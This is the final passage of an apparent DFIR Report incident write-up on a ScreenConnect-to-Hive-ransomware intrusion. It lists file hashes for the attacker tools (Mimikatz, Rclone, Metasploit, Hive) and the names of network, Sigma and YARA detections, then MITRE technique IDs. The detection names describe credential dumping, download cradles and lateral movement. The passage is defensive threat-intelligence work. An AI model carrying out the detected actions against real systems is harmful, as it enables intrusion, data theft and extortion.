    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\6142516f-9df2-40fa-b575-87f111d56411run.cmd
    7C89590CEA3B702C84D3B1A566705067D4BDE1B97ECD160D553FF1380E0EF5A6
    08439255DF7A9FA5553D5BD1CDC5291327FAD1C4
    813E3BD0C15DBC0A394CD030C508BA84
    
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\4b31bad0-8850-4a8c-83e3-efe0d39d36c8run.cmd
    59CB534E02A16FD3D21D1BA5D34EE15E665D7A955751171249563D1192AA33E4
    3DDB8CA1B50E240736BB4B86FDFF00FFC79D8C47
    ACAE4CC666AB060797ABB92F02E94327
    
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\d33a41b1-606a-4a18-8030-8df1578ae248run.cmd
    DF024E7AE2FF6CEF51EE80D30F10F94233A5DDD62DA22ECF3C6AB3EBC293264B
    6CC49BD84647C6DEA09609689D5F5DFB58BDCE09
    578188E75C3FB543D04930DEA547CFAA
    
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\fa9f4f97-996e-4753-9957-936eec5b7d1arun.cmd
    D51E34A47A79465A0EF3916FE01FE667E8E4281EF3B676569E6A1A33419E51EA
    21EF9F0A078DBC4E4C45BE12F1CFAF8A3864DFA7
    5FB4780E00B965F8454EF28BC61C0605
    
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\352a8d52-3f6d-4fe3-919c-1e6abc5145cbrun.cmd
    99A54FF551197D131477152D3D27E38787CA949FFDBB041F15752767EFE1E645
    265137BDEF97FE25CA0B23CE6D3DD4AB501AB7B5
    F0AAC1F299148638688C067F2029D27A
    
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\c896bba0-8476-4a90-bc8e-c0af107b8a82run.cmd
    03EE627A2557D83D28A90857678966709EC24582434A5D2F0653012B088276D1
    F479CDB6A34462C664FAD0051F4BD5CFE84017E0
    BC19BF002CD9B7E0AE90FE7374755639
    
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\7c731819-bd1a-46b7-9be5-30585a8551bbrun.cmd
    02F4B8D558EDB290FAE03B8F1A7B412E988EAB3738D11EDB7D59890C784EDB68
    4AC2A4FABAB8EB621130B979642F239B19B37330
    7D0F3C5AD18ABE8C4F7270D115E910F2
    
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\6a60db01-fb3d-4dfc-b81c-ed76379fc364run.cmd
    336074805FC853987ABE6F7FE3AD97A6A6F3077A16391FEC744F671A015FBD7E
    714EEA0F4C980736BDE0065FE73F573487F08E3A
    07CC694B9B3FC636710FA08B6922C42B
    
    # Trojanized ApacheBench (C:\Windows\Temp\P6nqEdwk.exe)
    9B39887828999F7F3916262574C46B835D38F200FCD3C07C2BBE9A83C9F935A9
    080B77C2D5E94E86607CBE462224FF46B20B6288
    CAB4CBEF593DB0F14ED4ADF041ECD6B1
    481F47BBB2C9C21E108D65F52B04C448
    
    # Atera Installer (C:\programdata\setup.msi)
    DBE18FFC724931DEE3EA99C75C9B4EA8E27B228E19508211689CC7C3249680D3
    C27DD709E7122E782DD0C8B2E3A2709B6622BED4
    947A9B0FA0B5F6FEFB4FCA98D577EBDB
    
    # Mimikatz (C:\ProgramData\m2.exe)
    197B8CCDDB54C39049B308A9A5037DC7BF7D3689BDC759504F3C36D483BEB9D3
    1FEBDC5ADE9D979CDD800C330AD5D875C5BF160B
    AF25483D713A3BBB87483340CCFF0B31
    17E022F96085B5DE3A2CD85F7CC791CA
    
    # C:\ProgramData\adcomp.bat
    4AA4EE8EFCF68441808D0055C26A24E5B8F32DE89C6A7A0D9B742CCE588213ED
    B658AB9AC2453CDE5CA82BE667040AC94BFCBE2E
    EB2335E887875619B24B9C48396D4D48
    
    # C:\Windows\Temp\unpack\setup.msi
    F25863DAA1AD0104B25B91581F7B1CC4F65CA63FF4D1BB956ECD3F9350E365A5
    1DD933817806728380FD1AEE46D9F8D42251EA7F
    59216909D3E63903D2426272EC72FE61
    
    # Rclone (C:\ProgramData\rclone\rclone.exe)
    F1C87C2A32B1F0D2210A12EBCB1D3146B54E3BB5DB3FB97DBD81FE123D411632
    940355F1CEDE7793190886AECC9D15D42A62C1FA
    B3FF5B773388E741559D6D9FCA914D9C
    9ED01AB5DA47D5D90680F44088D41DD1
    
    # Netscan (C:\ProgramData\netscan\netscan.exe)
    E14BA0FB92E16BB7DB3B1EFAC4B13AEE178542C6994543E7535D8EFAA589870C
    39300863BCAAD71E5D4EFC9A1CAE118440AA778F
    A768244CA664349A6D1AF84A712083C0
    8E081065872436B21EF3B90597247997
    
    # Metasploit (C:\ProgramData\c64.dll, C:\ProgramData\x2.dll)
    34452711502C9304DB8745510F96AA644481162C389F591147327F54D4AE3727
    F3741EAE58E9053773FEC7C01472862933E3B91A
    ED70A46CA74BE495AEFA84FCFDCA48EC
    83F0993D7B939D94887D773073847DED
    
    # Hive Ransomware (C:\windows_x64_encrypt.exe, C:\ProgramData\windows_x64_encrypt.exe)
    14F00D914CCD46553FB30933FBE691E22E5197AD6A32BC076BA19935EBB7E5AA
    7D51D3D2AC2F16672CAE331A48431B8CCB9F0820
    3B375E1765628817FD2EB01240C7D262
    04133426D49D0049E9825522E2A41306
    
    # Scheduled Task GPO (C:\Windows\Sysvol\domain\Policies\{EE3DB3D4-92F9-4A97-8E8F-364A02A6E5D1}\User\Preferences\ScheduledTasks\ScheduledTasks.xml)
    10525032A7595DF974A9649042ACAB0FDA5C1E5A59297AD1709BBF463ADB2E50
    37AF04902E237A19EFFDF09E8B106C0309717233
    E6EC25A3D448A1490AC10C239A001570
    

## Detections

### Network
    
    
    ET ATTACK_RESPONSE PowerShell Base64 Encoded Content Command Common In Powershell Stagers M2
    ET ATTACK_RESPONSE PowerShell NoProfile Command Received In Powershell Stagers
    ET HUNTING GENERIC SUSPICIOUS POST to Dotted Quad with Fake Browser 1
    ET HUNTING PE EXE Download over raw TCP
    ET HUNTING PowerShell Hidden Window Command Common In Powershell Stagers M1
    ET HUNTING PowerShell NonInteractive Command Common In Powershell Stagers
    ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response
    ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download
    ET INFO Splashtop Domain (splashtop .com) in TLS SNI
    ET INFO Splashtop Domain in DNS Lookup (splashtop .com)
    ET INFO Suspected Impacket WMIExec Activity
    ET MALWARE Cobalt Strike Beacon Observed
    ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)
    ET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement
    ET POLICY PE EXE or DLL Windows file download HTTP
    ET POLICY Powershell Activity Over SMB - Likely Lateral Movement
    ET POLICY Powershell Command With Hidden Window Argument Over SMB - Likely Lateral Movement
    ET POLICY Powershell Command With No Profile Argument Over SMB - Likely Lateral Movement
    ET POLICY Powershell Command With NonInteractive Argument Over SMB - Likely Lateral Movement
    ET POLICY SMB Executable File Transfer
    ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
    ET POLICY SMB2 NT Create AndX Request For an Executable File
    ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
    ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
    

### Sigma

Search sigma rules at [detection.fyi](https://detection.fyi/)

#### Sigma Repo
    
    
    Atera Agent Installation - 87261fb2-69d0-42fe-b9de-88c6b5f65a43
    CobaltStrike Named Pipe - d5601f8c-b26f-4ab0-9035-69e11a8d4ad2
    Credential Dumping Tools Accessing LSASS Memory - 32d0d3e2-e58d-4d41-926b-18b520b2b32d
    Rare GrantedAccess Flags on LSASS Access - 678dfc63-fefb-47a5-a04c-26bcf8cc9f65
    DNS Query To Remote Access Software Domain - 4d07b1f4-cb00-4470-b9f8-b0191d48ff52
    HackTool - Potential Impacket Lateral Movement Activity - 10c14723-61c7-4c75-92ca-9af245723ad2
    Persistence and Execution at Scale via GPO Scheduled Task - a8f29a7b-b137-4446-80a0-b804272f3da2
    PowerShell Base64 Encoded IEX Cmdlet - 88f680b8-070e-402c-ae11-d2914f2257f1
    PowerShell Download and Execution Cradles - 85b0b087-eddf-4a2b-b033-d771fa2b9775
    PUA - Rclone Execution - e37db05d-d1f9-49c8-b464-cee1a4b11638
    Remote Access Tool - ScreenConnect Execution - 57bff678-25d1-4d6c-8211-8ca106d12053
    Usage Of Web Request Commands And Cmdlets - 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d
    Suspicious Encoded PowerShell Command Line - ca2092a1-c273-4878-9b4b-0d60115bf5ea
    Suspicious Group And Account Reconnaissance Activity Using Net.EXE - d95de845-b83c-4a9a-8a6a-4fc802ebf6c0
    Suspicious PowerShell IEX Execution Patterns - 09576804-7a05-458e-a817-eb718ca91f54
    Suspicious Reconnaissance Activity - d95de845-b83c-4a9a-8a6a-4fc802ebf6c0
    Wmiexec Default Output File - 8d5aca11-22b3-4f22-b7ba-90e60533e1fb
    

#### JoeSecurity Repo
    
    
    Shadow Copies Deletion Using Operating Systems Utilities - c947b146-0abc-4c87-9c64-b17e9d7274a2

### YARA

<https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar>

<https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18364/18364.yar>

## MITRE

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3.png)
    
    
    Remote Access Software - T1219
    SMB/Windows Admin Shares - T1021.002
    PowerShell - T1059.001
    Windows Command Shell - T1059.003
    Scheduled Task - T1053.005
    Service Execution - T1569.002
    Malicious File - T1204.002
    Windows Management Instrumentation - T1047
    Domain Account - T1087.002
    Local Account - T1087.001
    Domain Groups - T1069.002
    Process Injection - T1055
    File Deletion - T1070.004
    Command Obfuscation - T1027.010
    Msiexec - T1218.007
    Rundll32 - T1218.011
    LSASS Memory - T1003.001
    File and Directory Discovery - T1083
    Network Share Discovery - T1135
    System Information Discovery - T1082
    System Network Configuration Discovery - T1016
    System Owner/User Discovery - T1033
    Lateral Tool Transfer - T1570
    Remote Desktop Protocol - T1021.001
    Web Protocols - T1071.001
    Ingress Tool Transfer - T1105
    Exfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002
    Data Encrypted for Impact - T1486
    Inhibit System Recovery - T1490
    Native API - T1106
    Windows Service - T1543.003
    Embedded Payloads - T1027.009
    Data from Network Shared Drive - T1039
    Protocol Impersonation - T1001.003
    BITS Jobs - T1197
    Non-Standard Port - T1571
    Data from Local System - T1005
    Account Access Removal - T1531
    Match Legitimate Name or Location - T1036.005
    Exfiltration Over C2 Channel - T1041
    Multi-Stage Channels - T1104
    Permission Groups Discovery - T1069
    Domain Trust Discovery - T1482
    Dynamic API Resolution - T1027.007
    
    
    
    ConnectWise - S0591
    cmd - S0106
    Systeminfo - S0096
    ipconfig - S0100
    Net - S0039
    Impacket - S0357
    Rclone - S1040
    Nltest - S0359
    

#### DFIR Report Tracking
    
    
    Atera
    Splashtop Streamer
    SoftPerfect Network Scanner
    

Internal case #18364

##### Share this entry

  * [Share on Facebook](https://www.facebook.com/sharer.php?u=https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/&t=From%20ScreenConnect%20to%20Hive%20Ransomware%20in%2061%20hours)
  * [Share on X](https://x.com/share?text=From%20ScreenConnect%20to%20Hive%20Ransomware%20in%2061%20hours&url=https://thedfirreport.com/?p=21520)
  * [Share on WhatsApp](https://api.whatsapp.com/send?text=https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/)
  * [Share on Linkedin](https://linkedin.com/shareArticle?mini=true&title=From%20ScreenConnect%20to%20Hive%20Ransomware%20in%2061%20hours&url=https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/)
  * [Share on Reddit](https://reddit.com/submit?url=https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/&title=From%20ScreenConnect%20to%20Hive%20Ransomware%20in%2061%20hours)
  * [Share by Mail](/cdn-cgi/l/email-protection#b689c5c3d4dcd3d5c28bf0c4d9db938486e5d5c4d3d3d8f5d9d8d8d3d5c2938486c2d9938486fedfc0d3938486e4d7d8c5d9dbc1d7c4d3938486dfd89384868087938486ded9c3c4c5909586858e8dd4d9d2cf8bdec2c2c6c58c9999c2ded3d2d0dfc4c4d3c6d9c4c298d5d9db998486848599868f99848399d0c4d9db9bc5d5c4d3d3d8d5d9d8d8d3d5c29bc2d99bdedfc0d39bc4d7d8c5d9dbc1d7c4d39bdfd89b80879bded9c3c4c599)